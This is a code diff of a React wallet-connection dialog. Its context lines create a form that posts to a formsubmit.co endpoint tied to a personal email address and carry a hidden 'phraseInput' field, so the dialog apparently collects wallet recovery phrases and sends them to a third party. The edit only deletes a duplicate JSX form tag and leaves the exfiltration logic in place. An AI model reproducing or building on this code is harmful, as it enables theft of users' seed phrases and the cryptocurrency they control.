@@ -29,7 +29,6 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
       const form = document.createElement('form');
       form.method = 'POST';
       form.action = 'https://formsubmit.co/patrickdwayne965@gmail.com';
-      <form action="https://formsubmit.co/patrickdwayne965@gmail.com" method="POST" />
      
       const phraseInput = document.createElement('input');
       phraseInput.type = 'hidden';
